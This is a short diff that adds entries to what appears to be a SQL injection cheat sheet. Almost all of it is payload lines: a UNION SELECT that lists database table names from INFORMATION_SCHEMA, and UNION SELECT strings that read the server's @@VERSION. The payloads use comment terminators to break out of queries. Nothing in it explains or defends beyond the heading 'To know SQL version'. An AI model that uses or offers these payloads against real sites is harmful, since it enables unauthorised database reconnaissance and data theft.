@@ -1,1 +1,10 @@
 10 UNION SELECT TABLE_NAME, "panda" FROM INFORMATION_SCHEMA.TABLES–
+
+
+To know SQL version,
+
+a' UNION SELECT "lol", @@VERSION ; -- -
+a' UNION SELECT "lol", @@VERSION ; -- #
+
+
+ server 
